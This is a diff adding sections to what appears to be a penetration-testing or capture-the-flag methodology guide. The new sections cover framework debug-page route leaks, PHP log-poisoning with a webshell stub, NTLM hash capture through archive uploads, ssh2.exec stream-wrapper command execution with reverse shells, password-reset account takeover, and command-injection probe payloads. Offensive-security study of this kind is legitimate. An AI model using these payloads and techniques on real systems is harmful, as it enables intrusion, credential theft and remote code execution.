@@ -63,6 +63,33 @@ search that returns the intended path and one that returns nothing actionable.
 Fuzz afterwards for what the manifest cannot know about: server-only API routes,
 backup files, and anything outside the framework's own router.
 
+## Server-side framework debug pages: request a 404 before you fuzz
+
+A framework left with its development error handler enabled (Phoenix `debug_errors`,
+Django `DEBUG`, Rails development, Laravel `APP_DEBUG`, Express `errorhandler`) answers
+a request for a path that does not exist with its **complete router table** — every
+verb, path and handler module, including routes no page links to (admin, OAuth, file
+proxies, "demo"/"dev" controllers). That is the whole directory-fuzzing phase for free
+and it is exact, so do it first:
+
+```bash
+curl -s https://target/this-does-not-exist-xyz > 404.html
+sed 's/<[^>]*>/ /g' 404.html | grep -oE '(GET|POST|PUT|PATCH|DELETE) +/[^ ]+( +[A-Za-z0-9_.]+)?' | sort -u
+```
+
+A 404 body that is tens of kilobytes is the tell. Then look for a route that actually
+crashes (a 500): the same handler renders the stack trace with source paths **and the
+request context** — headers, params and the decoded session (tokens, role ids, feature
+flags). Triage what the session contains before doing anything else; it is the map of
+the authorization model. Report the handler as a finding in its own right even when the
+leaked session is yours: it leaks every other user's the same way.
+
+Isolation between environments is measured at the trust layer, not by hostname. When a
+demo/staging/sandbox host is in scope, diff `/.well-known/openid-configuration` and
+`/oauth/jwks` across the environments: an identical `kid`/`n` or an `issuer` that names
+another host means shared signing material — a token minted on the weak host is valid on
+the strong one the moment the issuer is enabled there.
+
 ## Edge middleware is not an authorization boundary — look for the internal-subrequest header
 
 Frameworks that run authorization in "middleware" at the edge need a way to mark
@@ -157,6 +184,20 @@ target's workers and wedges it.
 ```
 Source disclosure via the `php://filter` wrapper is the highest-value LFI
 outcome: read `config.php`, `db.php`, `.env` and you usually have credentials.
+
+**An allow-listed "log viewer" that `include()`s (not reads) is log-poisoning RCE
+even with a `realpath()`+prefix check.** A guard like `realpath($f)` must start
+with `/var/log` + `is_readable` only restricts *which* file — if the handler then
+`include($f)`, any readable log you can write to executes as PHP. `access.log`
+(write via `User-Agent`/request line) is the usual sink; drive command input with
+`?c=<base64>` on the include request and keep the stub key quoted:
+`<?php system(base64_decode($_GET['c']));?>`. **Caveat — the channel is one
+mistake from permanently burned:** PHP compiles the whole log as one unit, so a
+single syntax error anywhere in it (e.g. an unquoted `$_GET[c]` fatal on PHP 8, or
+a stray byte from a quote mangled by your tooling) makes *every* later include
+return 0 bytes until the log rotates. Build the payload in a real client (not
+through a shell wrapper that eats quotes) and send simple, valid PHP; verify with a
+cheap `<?php echo 7*7;?>` marker before anything complex.
 
 **LFI → RCE via `pearcmd.php` when PEAR is installed.** If the include reaches an
 absolute/traversed path *and* PHP has `register_argc_argv=On` with PEAR in
@@ -453,6 +494,35 @@ has an admin-bot that visits URLs you supply.
 credential/cookie theft or an authed-action primitive, not just an alert box.
 Chain it to reach an admin-only route.
 
+## An upload that EXTRACTS an archive server-side — read the destination before reaching for a shell
+
+An upload that takes an *archive* (accepts several of zip/7z/rar and says
+"extracted") and unpacks it server-side is a different animal from a plain file
+upload. Enumerate the destination first — it tells you which class of bug is
+intended:
+
+- **Where do the extracted files land, and is that path web-servable?** Upload a
+  uniquely-named file, then request it. If the extract dir returns 403 for *both*
+  a real file and a nonexistent one, it is a config-level `Require all denied` — a
+  webshell there can never execute, and that denial is a deliberate signpost that
+  the intended primitive acts *outside* that folder.
+- **Is traversal actually possible?** Test `../`, Windows `..\`, and absolute
+  (`C:\...`) entry names across *every* accepted format and several depths. If all
+  are sanitised identically, the app uses one robust extractor (modern `ZipArchive`/
+  `7z` sanitise); stop hand-crafting traversal archives and re-read the design.
+- **The tell for NTLM coercion (Windows):** extract-to-a-web-inaccessible-folder
+  **+** a "someone reviews the upload" workflow (careers/resume/report portals) =
+  the file is meant to be opened in the *filesystem*, not served. Put a UNC-
+  referencing auto-trigger in the archive — a `.library-ms`
+  (`<simpleLocation><url>\\you\share</url>`), `.lnk`/`.url` with a UNC icon, `.scf`,
+  or `desktop.ini` — start Responder, and catch the reviewer/indexer's Net-NTLMv2.
+  The `.library-ms` variant fires on mere folder processing and needs the *full*
+  library XML, not a stub. Rank this **above** webshell/traversal the moment the
+  extract dir is web-denied. If the callback never lands, first confirm the box can
+  reach you at all (a prior capture from any host proves the VPN path) before
+  assuming your trigger is wrong — a dormant review task is a machine-state issue,
+  not an exploit bug.
+
 ## After exploitation
 
 Whatever the vector, aim for a reverse shell (see `references/foothold.md`) or
@@ -743,3 +813,80 @@ internal HTTP service instead.
 **Reporting angle.** The fix is never "validate the uploaded extension". It is to
 give the sandbox no route to loopback or RFC1918, and to stop returning the
 browser's verbose log to the submitter.
+
+## A user-controlled PHP stream wrapper in `fopen`/`file_get_contents` is RCE, not just file read
+
+Any sink of the shape `fopen($userinput . $path, ...)` / `file_get_contents($userinput.$path)`
+/ `include`/`readfile` where part of the argument is attacker-chosen is a
+**stream-wrapper injection**, and PHP's wrappers go well past file read:
+
+- `php://filter/...` — read source (base64) *if the result is echoed*. Useless
+  when the sink only `echo`es the resource handle (`Resource id #N`) rather than
+  the content — recognise that and pivot to a side-effecting wrapper.
+- `ssh2.exec://user:pass@host:port/command` — **command execution** on `host`
+  (usually `127.0.0.1`) as that SSH user, purely as a side effect of opening the
+  stream. Needs the `ssh2` PHP extension; confirm it (and egress) in one probe by
+  pointing `ssh2.exec://a:b@<you>:<port>/x` at your own listener — a
+  `SSH-2.0-libssh2_* PHP` banner hitting your socket proves both at once.
+- `expect://command`, `phar://evil.phar/x` (metadata unserialize → POP chain),
+  `data://`, `http(s)://` (SSRF) are the other members of the class.
+
+Method: when you find such a sink, (1) list which wrappers the build supports by
+probing, (2) if the sink is blind (echoes only a handle) choose a wrapper whose
+effect is observable out of band — `ssh2.exec` with a reverse shell / an
+HTTP `curl`-back, not `php://filter`. Two delivery traps: the app often
+**appends a fixed suffix** (e.g. the looked-up file path) to your wrapper string,
+so terminate the command with `;#` to comment the trailing bytes; and for
+`ssh2.exec` you need a real local credential (crack a leaked hash, reuse an app
+password) because there is no externally-exposed SSH. A credential is often
+reachable before this sink is (leaked DB, config, backup) — read first.
+Remediation to cite: never pass request input as a stream wrapper; allow-list
+concrete safe formats; disable unused wrappers.
+
+## Reset/recovery endpoints that take a username and no proof-of-ownership = account takeover
+
+A "reset security answers / password" handler that runs
+`UPDATE users SET answer1..3 WHERE user_name = ?` (or sets a reset token) using an
+**attacker-supplied username** with no check that it is the session user — paired
+with a recovery login that trusts those answers — is a one-request takeover of any
+account, including the admin. Test it with two throwaway accounts (set A's
+recovery material from B's session, then log in as A). Always check the recovery
+path, not just the primary login: the primary login is usually sound and the
+recovery flow is where the missing authorization lives.
+
+## A named-CVE narrative that refuses to fire is a decoy — probe what the endpoint actually does
+
+When an app loudly advertises the surface for one specific CVE (a `/cgi-bin/php-cgi`
+"PHP-CGI Handler" with a "we kept the Windows php-cgi.exe handling" note = an
+engraved invitation to CVE-2024-4577/2012-1823) and the canonical exploit will not
+trigger — the arg-injection gives a canned/constant response, no best-fit byte
+(sweep 0x80–0xFF for the one that maps to `-`) changes behaviour, every wrapper
+(`php://input`, `data://`, a file path) returns the same marker — treat the CVE as
+**bait**. A WAF that returns a fixed string only when it sees `php://input` is
+detection theatre, not a vuln. Stop iterating the CVE and characterise the real
+handler: vary the POST body and watch what comes back.
+
+The discriminator between reflection, `eval`, and shell is three payloads:
+
+```
+echo 1+1;      -> "2"            = eval (compute)
+echo 1+1;      -> "1+1"          = reflection (literal) OR shell echo
+echo `id`;     -> "uid=0(root)"  = the body is run in a SHELL (backticks execute)
+echo chr(65);  -> "A" vs "chr(65)"  = eval vs reflection
+```
+
+`echo \`id\`` returning command output means the endpoint pipes your input through
+a shell — often as root in a "diagnostic" pod. That is a plain command injection
+wearing a CVE costume, and it beats the CVE you were sent to chase.
+
+## WordPress POST payloads with NUL bytes get mangled by wp_magic_quotes
+
+A PHP-object-injection payload for a WP plugin (GiveWP CVE-2024-5932 and kin) that
+needs real `\x00` bytes for protected-property names (`s:10:"\0*\0_values"`)
+frequently *fails hand-rolled* even though the serialization is byte-correct: WP's
+`wp_magic_quotes()` addslashes-es `$_POST` and the plugin may `unserialize()`
+before `wp_unslash()`, so your declared string lengths no longer match. A clean 302
+to the normal success page with no execution is the symptom. Rather than reverse
+the exact slashing, deliver via the published exploit's own encoding (the bypass
+variant — e.g. CVE-2024-8353 for GiveWP — or the Metasploit module handles it) and
+use it only to drop a webshell; then work from the shell.
